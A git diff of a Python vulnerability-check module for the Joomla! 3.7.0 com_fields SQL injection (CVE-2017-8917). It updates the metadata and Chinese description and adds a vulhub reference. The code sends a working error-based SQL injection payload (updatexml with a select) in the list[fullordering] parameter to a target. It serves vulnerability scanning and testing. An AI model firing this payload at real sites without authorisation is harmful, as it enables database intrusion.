@@ -6,15 +6,16 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 class Vuln(ABVuln):
     vuln_id = 'Joomla_0001'  # 平台漏洞编号，留空
-    name = 'Joomla! 3.7.0 Core SQL Injection'  # 漏洞名称
+    name = 'Joomla! com_fields组件SQL注入漏洞(CNVD-2017-06861)'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2017-05-11'  # 漏洞公布时间
     desc = '''
-        Joomla! 于5月17日发布了新版本3.7.1,（(Joomla! 3.7.1 Release News)[https://www.joomla.org/announcements/release-news/5705-joomla-3-7-1-release.html]），本次更新中修复一个高危SQL注入漏洞（[20170501] - Core - SQL Injection)，成功利用该漏洞后攻击者可以在未授权的情况下进行SQL注入。
+        Joomla!是美国Open Source Matters团队的一套使用PHP和MySQL开发的开源、跨平台的内容管理系统(CMS)。
+        Joomla! 3.7.0版本中的com_fields组件存在SQL注入漏洞，远程攻击者无需任何身份认证，可获取数据库敏感信息，包括管理员登录信息并控制网站后台。
     '''  # 漏洞描述
-    ref = 'https://www.seebug.org/vuldb/ssvid-93113'  # 漏洞来源
-    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-06861'  # 漏洞来源
+    cnvd_id = 'CNVD-2017-06861'  # cnvd漏洞编号
     cve_id = 'CVE-2017-8917'  # cve编号
     product = 'Joomla!'  # 漏洞应用名称
     product_version = 'Joomla! 3.7.0'  # 漏洞应用版本
@@ -32,6 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
+
+            #https://github.com/vulhub/vulhub/tree/master/joomla/CVE-2017-8917
             payload = {'option':'com_fields','view':'fields','layout':'modal','list[fullordering]':'updatexml(0x3a,concat(1,(select md5(1))),1)'}
             request = requests.get('{target}'.format(target=self.target), params=payload)
             r = request.text
